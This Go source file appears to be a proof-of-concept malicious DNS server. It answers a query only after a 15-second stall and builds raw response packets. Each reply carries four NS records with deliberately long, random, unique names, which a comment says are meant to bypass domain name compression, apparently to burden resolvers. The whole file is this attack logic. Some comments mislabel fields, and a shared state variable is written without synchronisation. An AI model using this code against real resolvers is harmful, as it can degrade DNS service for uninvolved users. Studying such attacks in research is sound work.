package server

import (
	"auth/packetbuilder/protocol"
	"fmt"
	"time"

	"github.com/google/gopacket/layers"
)

type Message struct {
	Payload []byte // Payload
	SrcPort int    // Source port
}

// Sleep for a specified duration (during which received packets are discarded). After the sleep ends, respond to the next received packet, then start a new cycle.
func (s *Server) queryAggregation() {
	setTimeOut := 15 // Timeout duration
	messageChan := make(chan Message)
	domain := "example.com"
	state := "waiting" // States: waiting, sleeping, ready

	go ListenUDP(s.DstIP, 53, messageChan)

	for {
		select {
		case msg := <-messageChan:
			switch state {
			case "waiting":
				// Received the first packet, start sleeping
				fmt.Printf("Received packet, starting a blocking timeout of %v seconds\n", setTimeOut)
				state = "sleeping"

				go func() {
					// Sleep for the specified duration
					time.Sleep(time.Duration(setTimeOut) * time.Second)
					// After sleep ends, change state to ready
					state = "ready"
					fmt.Println("Blocking ended, waiting for new DNS queries")
				}()

			case "sleeping":
				// Discard packets received during sleep
				fmt.Println("Packet received during blocking, ignoring")

			case "ready":
				// After sleep ends, respond to the first received packet
				query, err := protocol.DNSParse(msg.Payload)
				if err != nil {
					fmt.Println("Failed to parse DNS packet,", err)
					state = "waiting" // Reset state
					continue
				}

				// Build response
				response := protocol.DNSResponse()
				response.ID = query.ID
				response.RA = false
				response.Questions[0] = query.Questions[0]
				response.Questions[0].Name = []byte(domain)
				// To bypass domain name compression, make NS records as long as possible and ensure each domain name is unique
				response.Answers = []layers.DNSResourceRecord{
					{
						Name:  []byte(domain),
						Type:  layers.DNSTypeNS,
						Class: layers.DNSClassIN,                                                                                                                                                                                                                                                       // IN class
						TTL:   36000,                                                                                                                                                                                                                                                                   // TTL in seconds
						NS:    []byte("fd92yovrr5t3oaa9jahtdjauh4rtguv1da3ovzge399f2mvagbvxg4r000cjllr.v0fg52suitru09b8sarrxk7mz3u7kzkwnapfb0b5vfvhl6tf6xh0pff1nk87qhg.ojrjh5vnqm2uot8kti5r9w5cwzx1oeki6t9jfq2dlj6izlbfy4ha5na64do.ssonk0151omineqtnjdsvh6ubag4o53n3civj9q6mecxldunywpteuxtn8878.com"), // Response IP address
					},
					{
						Name:  []byte(domain),
						Type:  layers.DNSTypeNS,
						Class: layers.DNSClassIN,                                                                                                                                                                                                                                                       // IN class
						TTL:   36000,                                                                                                                                                                                                                                                                   // TTL in seconds
						NS:    []byte("80yzwm6r7zjkg834ixo2lqmv5ddozfnniedcb3c3uwmjn03qtup0zb5ewpqwuhc.nijsi94mxd12esjonaq9c48dz3bj8svicu7kor5n9ls4ykp4igu1r3yf9lssb80.3vnw5xqxtvvc06zw5agg2fn0cz7z1p6my45vgb4nnxekab9pm4jff8vf6ep.973z6kw2ytcg94xzxoszxeiy5pub3cakv5y3bcfno894l33e3hdqfkapkbb0w.com"), // Response IP address
					},
					{
						Name:  []byte(domain),
						Type:  layers.DNSTypeNS,
						Class: layers.DNSClassIN,                                                                                                                                                                                                                                                       // IN class
						TTL:   36000,                                                                                                                                                                                                                                                                   // TTL in seconds
						NS:    []byte("1nquklci8g555cpze82c7e02uqfkyxoy24yi18cpja88kqy33g5smqg3yjecz0r.bm85yd0c063zk7hsd9yykykxhj4p6lub8tmqob8zshhac8by6sn7puj9ya2i7ci.epr5viravte0dtqqus7l46djvfijk11ffc947s70f98u456trimyi882bqo.1niplcvnt6agrvbyyi6qij8bpdaishs4zmeqx0pceiwetuoxwlurso4l4n9ln.com"), // Response IP address
					},
					{
						Name:  []byte(domain),
						Type:  layers.DNSTypeNS,
						Class: layers.DNSClassIN,                                                                                                                                                                                                                                                     // IN class
						TTL:   36000,                                                                                                                                                                                                                                                                 // TTL in seconds
						NS:    []byte("2rafj3v0y394mrttsx6ezohz4ult8c336eoi43k1suwmcbn9gg26sfy449v75.2rafj3v0y398mrttsx6ezohz4ult8c336eoi43k1suwmcbn9gg26sfy449v75.2rafjtv0y398mrttsx6ezohz4ult8c336eoi43k1suwmcbn9gg26sfy449v75.2rafj3v0y394mrttsx6ezohz4ult8c336eoi43k1suwmcbn9gg26sfy449v75.com"), // Response IP address
					},
				}

				// Send packet
				packet, err := protocol.DNSPacket(s.SrcIP, s.DstIP, 53, msg.SrcPort, response)
				if err != nil {
					fmt.Println("Failed to construct DNS packet")
					state = "waiting" // Reset state
					continue
				}

				protocol.SendPacket(s.DstIP, packet)
				fmt.Println("DNS response sent")
				state = "waiting" // Reset state, start a new cycle
			}
		}
	}
}
